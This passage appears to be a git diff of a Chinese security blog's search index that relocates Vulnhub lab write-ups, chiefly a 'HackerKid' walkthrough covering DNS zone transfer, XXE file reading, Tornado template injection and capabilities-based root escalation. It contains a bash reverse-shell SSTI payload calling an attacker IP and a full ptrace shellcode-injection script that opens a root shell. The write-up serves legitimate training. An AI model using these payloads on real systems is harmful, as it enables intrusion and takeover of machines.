+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160607.png" /></p>
+<p>成功提权到root！接下来获取第二个flag<code>/root/root.txt</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160550.png" /></p>
+<p>其实也可以通过<code>/usr/bin/cat</code>直接读取flag。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160915.png" /></p>
+<p>本台靶机到此结束！</p>
+<h1 id="总结">总结</h1>
+<p>该靶机的难度主要在于<strong>破壳漏洞</strong>的发现以及 <strong>GTFOBins漏洞</strong>利用。练习这么多个靶机以来第一次碰到这样的漏洞以及利用方式。</p>
+<p>还有一点，就是如果发现目标站点使用的是开源的框架，可以尝试以下默认的账号和密码。</p>
+]]></content>
+      <tags>
+        <tag>综合</tag>
+        <tag>vulnhub</tag>
+        <tag>破壳漏洞</tag>
+        <tag>开源源码泄露</tag>
+        <tag>GTFOBins提权</tag>
       </tags>
   </entry>
   <entry>
@@ -1159,165 +1159,6 @@
       </tags>
   </entry>
   <entry>
-    <title>7 Vulnhub HackerKid1.0.1 Writeup</title>
-    <url>/2022/04/08/7%20Vulnhub%20HackerKid1.0.1%20Writeup/</url>
-    <content><![CDATA[<p>该靶机难度介于简单和中等之间，具有OSCP风格，不建议爆破，每一步都会有适当的提示。渗透所用到的攻击方式比较新（较前几个靶机来说）。</p>
-<span id="more"></span>
-<h1 id="靶机信息">靶机信息</h1>
-<p>靶机地址：<a href="https://www.vulnhub.com/entry/hacker-kid-101,719/">hacker_kid</a></p>
-<p>难度：Easy/Medium (Intermediate)。OSCP风格的中级难度靶机</p>
-<p>目标：取得root权限（关注信息收集，不需要蛮力破解，每一步都有适当的提示）</p>
-<p>涉及攻击方法：</p>
-<ul>
-<li>主机发现</li>
-<li>端口扫描</li>
-<li>Web信息收集</li>
-<li><strong>DNS域传送</strong></li>
-<li>XXE注入攻击</li>
-<li>SSTI模板注入</li>
-<li><strong>Capabilities提权</strong></li>
-</ul>
-<h1 id="dns域传送">DNS域传送</h1>
-<h2 id="dns域简介">DNS域简介</h2>
-<p>DNS (Domain Name System)的作用是将域名转为对应的IP。<strong>DNS域是DNS服务器提供服务的域名空间的一部分</strong>。例如，<code>cloudflare.com</code>及其所有子域（<code>*.cloudflare.com</code>）可能是一个DNS域，当然<code>blog.example.com</code>也可能是一个单独的DNS域。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407230721.png" /></p>
-<p><strong>同一个服务器上可以有多个web应用</strong>，一般有以下三种情况：</p>
-<ol type="1">
-<li>给这台服务器分配多个IP地址，每个web应用的域名对应的IP地址都不一样，这样子就可以通过不同的域名或者IP地址访问不同的web应用；</li>
-<li>这台服务器只有一个IP地址，但是开放多个端口，可以把不同的web应用绑定在不同的端口上，这样子就能够通过不同的域名访问对应的web应用；</li>
-<li>这台服务器只有一个IP地址，也只开放了一个端口，这时候就需要利用<strong>虚拟主机技术</strong>，就是通过不同的域名去访问这台服务器，服务器会根据域名响应对应的web应用；（比如：<code>/etc/hosts</code>中将不同的域名对应同一个IP）</li>
-</ol>
-<h2 id="为什么需要dns域传送">为什么需要DNS域传送</h2>
-<p>DNS是非常重要的一个服务，如果DNS域的DNS服务器不工作，或者保存的信息过期了，那么这个域内的所有域名都无法被解析，因而对应的服务也就无法被访问。因此，每个域至少应该有两个DNS服务器，对于更关键的区域，可能存在着更多的DNS服务器。</p>
-<p>有的DNS域非常的大，并且域内的信息可能经常改变。此时，如果管理员在该域内的每台DNS服务器上手动的修改信息的话，这不仅耗费大量的时间，而且也容易出错。因此，这时候就需要DNS域传送机制。</p>
-<p>DNS域传送的作用：管理员只需要在主DNS服务器上进行修改，然后其他DNS服务器可以通过某种协议来请求主DNS服务器上的全部信息。其中最简单的协议就是<code>AXFR</code>。</p>
-<h2 id="dns域传送漏洞">DNS域传送漏洞</h2>
-<p>其实主要的是<code>AXFR</code>协议存在漏洞，该协议允许域内所有客户端请求DNS服务器上的信息。只需要获得一台域内的主机，就可以通过该漏洞获得该DNS域内所有子域名。本质上就是一种<strong>信息泄露漏洞</strong>。</p>
-<h2 id="dns域名解析">DNS域名解析</h2>
-<p>DNS服务同时占用TCP和UDP的53端口。DNS在进行域传送的时候使用TCP协议，其它时候则使用UDP协议。</p>
-<p>所以，如果一台主机开启了<code>53/TCP</code>，那么该主机也极大可能开启<code>53/UDP</code>，并且该主机基本可以认定为是一台DNS服务器。但是反过来，如果某台主机开启了<code>53/UDP</code>，那么该主机不一定开启了<code>53/TCP</code>，因此，该主机是DNS服务器的可能性也不大。</p>
-<h1 id="capabilities技术">Capabilities技术</h1>
-<p>Capabilities是Linux的一个内核功能。作用：权限管理。该功能将操作系统很多需要特权才能执行的操作（通常只有root和管理员才能执行的系统操作）分成40+个功能。每一个功能都能单独的赋予给程序。当某个程序被赋予了功能，那么即使执行该程序的只是普通用户（不是root，没有suid，不在root组等），也能够使用对应的特权操作。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setcap</span> cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap</span><br><span class="line"><span class="comment"># 赋予/usr/bin/dumpcap程序抓数据包和抓网络管理相应组件两种能力。</span></span><br></pre></td></tr></table></figure>
-<p>参考文档：<a href="https://linux.die.net/man/7/capabilities">Capabilities</a></p>
-<h1 id="渗透">渗透</h1>
-<p>攻击机kali：10.0.2.4</p>
-<h2 id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l <span class="comment"># 靶机为10.0.2.10</span></span><br><span class="line">sudo nmap -p- 10.0.2.10</span><br><span class="line">sudo nmap -p53,80,9999 -A 10.0.2.10</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408084845.png" /></p>
-<p>53端口上是域服务，版本为ISC BIND 9.16.1，并且开启的是53/TCP，有理由认为该主机是域内的DNS服务器，并且53/UDP也是开启着的。输入下面命令验证下： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p53 -sU 10.0.2.10</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408085115.png" /></p>
-<p>发现确实如此。ISC BIND 9.16.1 存在着两个远程代码执行漏洞，编号为CVE-2020-8625和CVE-2021-25216（找不到漏洞利用代码）</p>
-<p>80端口和9999端口开着的都是http服务。80端口上是apache2，9999端口上是tornado，这是python语言的一个模板，所以后续可能会用到模板注入！</p>
-<p>靶机的OS是Ubuntu。</p>
-<h2 id="访问http服务">访问http服务</h2>
-<p>先访问80端口，页面如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408085401.png" /></p>
-<p>这里注意到一个大写的单词<code>DIG</code>，这是Linux的一个工具，但是使用该工具需要知道靶机的域名，因此接下来就是需要找到关于域名的信息。</p>
-<p>查看页面源码的小技巧：</p>
-<ol type="1">
-<li>一方面关注这个页面到底引用了哪些页面资源，存在哪些路径</li>
-<li>另一方面得关注<strong>注释信息</strong></li>
-</ol>
-<p>查看源码，在最后发现了某一行注释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TO DO: Use a GET parameter page_no  to view pages.</span><br></pre></td></tr></table></figure></p>
-<p>也就是在该页面上存在着一个参数<code>page_no</code>，以GET方式提交。</p>
-<p>又看了一些其他网址，比如主页上的<code>App</code>和<code>Form</code>，<strong>直接点击会出现<code>10.0.2.10/#from.html</code>，把<code>#</code>去掉就可以直接访问了</strong>。但是，发现虽然有很多表单，但是并没有可用的地方，基本都只是做个样子。</p>
-<p>那先带入<code>page_no</code>去访问一下，看一下页面会不会发生什么变化。尝试了1，2，3，4之后发现变化都一样，多了一句话<code>Oh Man !! Isn't is right to go a little deep inside?</code>，因此用burp来跑，后面肯定还有变化。结果发现，当<code>page_no=21</code>时，返回的响应包长度出现了变化。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408090450.png" /></p>
-<p>直接访问发现页面的话变成了如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Okay so you want me to speak something ?  </span><br><span class="line">I am a hacker kid not a dumb hacker. So i created some subdomains to return back on the server whenever i want!!  </span><br><span class="line">Out of my many homes...one such home..one such home for me : hackers.blackhat.local</span><br></pre></td></tr></table></figure></p>
-<p>发现了一个域名<code>hackers.blackhat.local</code>，这其实是一个三级域名，<code>blackhat.local</code>也是一个域名。因此，获得了两个域名。</p>
-<p>将域名添加到<code>/etc/hosts</code>。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408091613.png" /></p>
-<p>然后直接用浏览器访问，发现<code>hackers.blackhat.local</code>页面和最开始的界面一样，而<code>blackhat.local</code>没有权限访问。</p>
-<p>接下来访问9999端口，发现是一个登录界面</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408091937.png" /></p>
-<p>那两个域名加上9999端口也都是同样的界面，等会测试。</p>
-<h2 id="dns域传送漏洞-1">DNS域传送漏洞</h2>
-<p>利用<code>DIG</code>配合<code>AXFR</code>协议获取更多的域内信息。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig axfr @10.0.2.10 hackers.blackhat.local <span class="comment"># 失败</span></span><br><span class="line">dig axfr @10.0.2.10 blackhat.local</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408092336.png" /></p>
-<p>获得了更多的域名信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hackerkid.blackhat.local</span><br><span class="line">ftp.blackhat.local</span><br><span class="line">mail.blackhat.local</span><br><span class="line">hacker.blackhat.local.blackhat.local</span><br><span class="line">www.blackhat.local</span><br></pre></td></tr></table></figure></p>
-<p>把这些都写入<code>/etc/hosts</code>然后用浏览器直接访问。</p>
-<p>在80端口下，上面5个域名中，第一个域名出现了如下界面</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408093020.png" /></p>
-<p>第五个域名没有权限访问，其他的域名都和原来的界面一样。</p>
-<p>在9999端口下，5个域名访问的和之前9999端口的界面一样。</p>
-<p>填写表单，抓取<code>hackerkid.blackhat.local:80</code>数据包看一下</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408093729.png" /></p>
-<p>发现了两点：</p>
-<ol type="1">
-<li>这个表单是XML提交的</li>
-<li>无论我们在<code>&lt;email&gt;</code>标签内提交什么内容，都会被原封不动的返回回来<code>Sorry, hdfzzf@gmail.com is not available !!!</code></li>
-</ol>
-<p>先分析第二点，不论我们输入什么内容，服务端都会原封不动得返回给我们，这是三种漏洞的特征：</p>
-<ol type="1">
-<li>XSS漏洞</li>
-<li>XXE漏洞</li>
-<li>SSTI漏洞</li>
-</ol>
-<p>又因为这里的表单是XML，所以怀疑这里存在着XXE漏洞。</p>
-<h2 id="xxe漏洞">XXE漏洞</h2>
-<p>先验证以下是否存在XXE漏洞，抓数据包修改，然后发送</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408100434.png" /></p>
-<p>发现确实返回了<code>/etc/passwd</code>中的内容，说明确实存在XXE漏洞。寻找跟<code>/bin/bash</code>有关的账号： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">saket:x:1000:1000:Ubuntu,,,:/home/saket:/bin/bash</span><br></pre></td></tr></table></figure></p>
-<p>然后利用该漏洞读取文件内容： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/home/saket/.bashrc <span class="comment"># bash配置信息</span></span><br><span class="line">/home/saket/id_rsa <span class="comment"># 私钥</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
-<p>但是发现什么内容都读取不出来，这时候文件可能存在内容，但是别限制不允许明文输出，于是使用 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=/home/saket/.bashrc</span><br></pre></td></tr></table></figure></p>
-<p>将得到的内容解码发现了</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408101522.png" /></p>
-<p>首先猜测这是哪里的密码，因为这台靶机没有开22端口，所以不存在ssh连接。忽然想到，刚刚9999端口存在登陆界面，因此去那里尝试一下。</p>
-<p>发现用下面的信息登录不成功。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: Saket!#$%@!!</span><br></pre></td></tr></table></figure></p>
-<p>但是配置文件中的信息不太可能是假的，那就尝试将用下面信息登录（<code>/bin/bash</code>中有saket这个账号），发现居然成功了。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: saket</span><br><span class="line">password: Saket!#$%@!!</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408102116.png" /></p>
-<p>从上图中的语句中分析，可能我们需要传入一个参数<code>name</code>，当然也可以通过参数爆破，理论上是可行的，不过该靶机不建议爆破，因此先尝试一下。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408103126.png" /></p>
-<p>因此，这里可能<code>name</code>可能存在着某种注入漏洞。经过测试，发现无论我们在后面加入什么值，都会原封不动的返回。根据之前的描述，共有三种情况，但是XSS和XXE不太可能出现在url中，因此猜测可能存在SSTI。并且最开始收集的信息中也显示9999端口上是tornado模板，所以SSTI的可能性很大，并且模板引擎为tornado。</p>
-<h2 id="ssti漏洞-get-shell">SSTI漏洞 Get shell</h2>
-<p>模板注入通杀payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;1+abcxyz&#125;&#125;$&#123;1+abcxyz&#125;&lt;%1+abcxyz%&gt;[abcxyz]</span><br></pre></td></tr></table></figure></p>
-<p>如果存在报错，基本说明服务端存在SSTI。abcxyz尽量选择无规则的字符，这样可以保证服务端没有定义过该变量名。此时，服务端引用该变量名就会报错，从而判断可能存在模板注入。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;7*7&#125;,&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>看一下哪一个被执行了，从而可以判断模板引擎和语言。前者表示的PHP类模板，而后者表示python类模板。Java模板不多。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408103754.png" /></p>
-<p>如果是python，可以利用下面代码进行反弹shell（kali先开启监听） <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">import</span> os %&#125;&#123;&#123;os.system(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.2.4/3333 0&gt;&amp;1&quot;&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>如果报错了，需要对上述payload进行一些编码，比如url编码（花括号，百分号，引号，斜杠等特殊符号都需要编码）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%7B%25%20import%20os%20%25%7D%7B%7Bos.system(%27bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.4%2F3333%200%3E%261%22%27)%7D%7D</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408103958.png" /></p>
-<p>成功突破边界！</p>
-<h2 id="权限提升capabilities提权">权限提升——Capabilities提权</h2>
-<p>不论是内核漏洞、sudo配置不当以及suid都没找到可以利用的点。也不能像<code>6 EvilBoxOne</code>一样找到拥有写权限的可利用文件。</p>
-<p>这里介绍一种新的提权方式： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
-<p>上述命令是查看系统上所有程序的功能。<code>-r</code>：递归。如果没有结果，可以先输入<code>getcap</code>查看一下位置在哪，然后 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/sbin/<span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408105514.png" /></p>
-<p><strong>注意<code>cap_sys_ptrace+ep</code>可以用来提权</strong>。也就是上图中的<code>python2.7</code>拥有的功能。参考链接：<a href="https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc">cap_sys_ptrace提权</a></p>
-<p>下载利用脚本，不过链接失效了。下面是脚本的源码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># inject.py# The C program provided at the GitHub Link given below can be used as a reference for writing the python script.</span></span><br><span class="line"><span class="comment"># GitHub Link: https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># Macros defined in &lt;sys/ptrace.h&gt;</span></span><br><span class="line"><span class="comment"># https://code.woboq.org/qt5/include/sys/ptrace.h.html</span></span><br><span class="line"></span><br><span class="line">PTRACE_POKETEXT = <span class="number">4</span></span><br><span class="line">PTRACE_GETREGS = <span class="number">12</span></span><br><span class="line">PTRACE_SETREGS = <span class="number">13</span></span><br><span class="line">PTRACE_ATTACH = <span class="number">16</span></span><br><span class="line">PTRACE_DETACH = <span class="number">17</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Structure defined in &lt;sys/user.h&gt;</span></span><br><span class="line"><span class="comment"># https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user_regs_struct</span>(<span class="params">ctypes.Structure</span>):</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">&quot;r15&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r14&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r13&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r12&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rbp&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rbx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r11&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r10&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r9&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r8&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rax&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rcx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rdx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rsi&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rdi&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;orig_rax&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rip&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;cs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;eflags&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rsp&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;ss&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;fs_base&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;gs_base&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;ds&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;es&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;fs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;gs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pid = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define argument type and respone type.</span></span><br><span class="line">libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]</span><br><span class="line">libc.ptrace.restype = ctypes.c_uint64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Attach to the process</span></span><br><span class="line">libc.ptrace(PTRACE_ATTACH, pid, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">registers = user_regs_struct()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Retrieve the value stored in registers</span></span><br><span class="line">libc.ptrace(PTRACE_GETREGS, pid, <span class="literal">None</span>, ctypes.byref(registers))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Instruction Pointer: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Injecting Shellcode at: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Shell code copied from exploit db.</span></span><br><span class="line">shellcode = <span class="string">&quot;\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Inject the shellcode into the running process byte by byte.</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">4</span>):</span><br><span class="line">    <span class="comment"># Convert the byte to little endian.</span></span><br><span class="line">    shellcode_byte_int = <span class="built_in">int</span>(shellcode[i:<span class="number">4</span> + i].encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">    shellcode_byte_little_endian = struct.pack(<span class="string">&quot;&lt;I&quot;</span>, shellcode_byte_int).rstrip(<span class="string">&#x27;\x00&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    shellcode_byte = <span class="built_in">int</span>(shellcode_byte_little_endian, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Inject the byte.</span></span><br><span class="line">    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip + i), shellcode_byte)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Shellcode Injected!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Modify the instuction pointer</span></span><br><span class="line">registers.rip = registers.rip + <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the registers</span></span><br><span class="line">libc.ptrace(PTRACE_SETREGS, pid, <span class="literal">None</span>, ctypes.byref(registers))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Instruction Pointer: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Detach from the process.</span></span><br><span class="line">libc.ptrace(PTRACE_DETACH, pid, <span class="literal">None</span>, <span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2.7 inject.py processID <span class="comment"># 将后门进程注入到对应ID的进程</span></span><br></pre></td></tr></table></figure>
-<p>（注意，一定要注入到root用户的进程）</p>
-<p>root的进程很多，所以写一个简单的脚本进行批量化尝试： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> pid <span class="keyword">in</span> `ps -ef|grep root|grep -v <span class="string">&quot;grep&quot;</span>|awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`; <span class="keyword">do</span> python2.7 inject.py <span class="variable">$pid</span>; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单说明：ps -ef查看进程情况，一个进程一行，grep root只列出带有root的行（进程），grep -v &quot;grep&quot;不显示带有grep的行（进程），awk &#x27;&#123;print $2&#125;&#x27;显示每一行的第二个位置（从1开始）即PID。</span></span><br></pre></td></tr></table></figure></p>
-<p>该后门利用的是5600端口，如果执行完毕之后该端口开启，说明注入成功 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -tunpla |grep 5600</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408114925.png" /></p>
-<p>然后利用nc连接即可提权到root。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 0.0.0.0 5600</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408115600.png" /></p>
-<p>成功提权，该靶机到此结束。</p>
-<h1 id="总结">总结</h1>
-<p>通过对该靶机的渗透学到了：</p>
-<ul>
-<li>DNS域传送漏洞的利用以及DNS的相关知识</li>
-<li>XXE漏洞即XML相关知识</li>
-<li>SSTI漏洞的get shell方式</li>
-<li>Capabilities技术的提权</li>
-</ul>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>综合</tag>
-        <tag>vulnhub</tag>
-        <tag>DNS域传送漏洞</tag>
-        <tag>Capabilities提权</tag>
-        <tag>SSTI get shell</tag>
-        <tag>XXE漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>6 Vulnhub EvilBoxOne Writeup</title>
     <url>/2022/04/07/6%20Vulnhub%20EvilBoxOne%20Writeup/</url>
     <content><![CDATA[<p>该靶机难度介于简单和中等之间。不过还是能够学到很多知识。</p>
@@ -1484,6 +1325,165 @@
         <tag>SSH公钥登录</tag>
         <tag>参数爆破</tag>
         <tag>PHP伪协议</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>7 Vulnhub HackerKid1.0.1 Writeup</title>
+    <url>/2022/04/08/7%20Vulnhub%20HackerKid1.0.1%20Writeup/</url>
+    <content><![CDATA[<p>该靶机难度介于简单和中等之间，具有OSCP风格，不建议爆破，每一步都会有适当的提示。渗透所用到的攻击方式比较新（较前几个靶机来说）。</p>
+<span id="more"></span>
+<h1 id="靶机信息">靶机信息</h1>
+<p>靶机地址：<a href="https://www.vulnhub.com/entry/hacker-kid-101,719/">hacker_kid</a></p>
+<p>难度：Easy/Medium (Intermediate)。OSCP风格的中级难度靶机</p>
+<p>目标：取得root权限（关注信息收集，不需要蛮力破解，每一步都有适当的提示）</p>
+<p>涉及攻击方法：</p>
+<ul>
+<li>主机发现</li>
+<li>端口扫描</li>
+<li>Web信息收集</li>
+<li><strong>DNS域传送</strong></li>
+<li>XXE注入攻击</li>
+<li>SSTI模板注入</li>
+<li><strong>Capabilities提权</strong></li>
+</ul>
+<h1 id="dns域传送">DNS域传送</h1>
+<h2 id="dns域简介">DNS域简介</h2>
+<p>DNS (Domain Name System)的作用是将域名转为对应的IP。<strong>DNS域是DNS服务器提供服务的域名空间的一部分</strong>。例如，<code>cloudflare.com</code>及其所有子域（<code>*.cloudflare.com</code>）可能是一个DNS域，当然<code>blog.example.com</code>也可能是一个单独的DNS域。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407230721.png" /></p>
+<p><strong>同一个服务器上可以有多个web应用</strong>，一般有以下三种情况：</p>
+<ol type="1">
+<li>给这台服务器分配多个IP地址，每个web应用的域名对应的IP地址都不一样，这样子就可以通过不同的域名或者IP地址访问不同的web应用；</li>
+<li>这台服务器只有一个IP地址，但是开放多个端口，可以把不同的web应用绑定在不同的端口上，这样子就能够通过不同的域名访问对应的web应用；</li>
+<li>这台服务器只有一个IP地址，也只开放了一个端口，这时候就需要利用<strong>虚拟主机技术</strong>，就是通过不同的域名去访问这台服务器，服务器会根据域名响应对应的web应用；（比如：<code>/etc/hosts</code>中将不同的域名对应同一个IP）</li>
+</ol>
+<h2 id="为什么需要dns域传送">为什么需要DNS域传送</h2>
+<p>DNS是非常重要的一个服务，如果DNS域的DNS服务器不工作，或者保存的信息过期了，那么这个域内的所有域名都无法被解析，因而对应的服务也就无法被访问。因此，每个域至少应该有两个DNS服务器，对于更关键的区域，可能存在着更多的DNS服务器。</p>
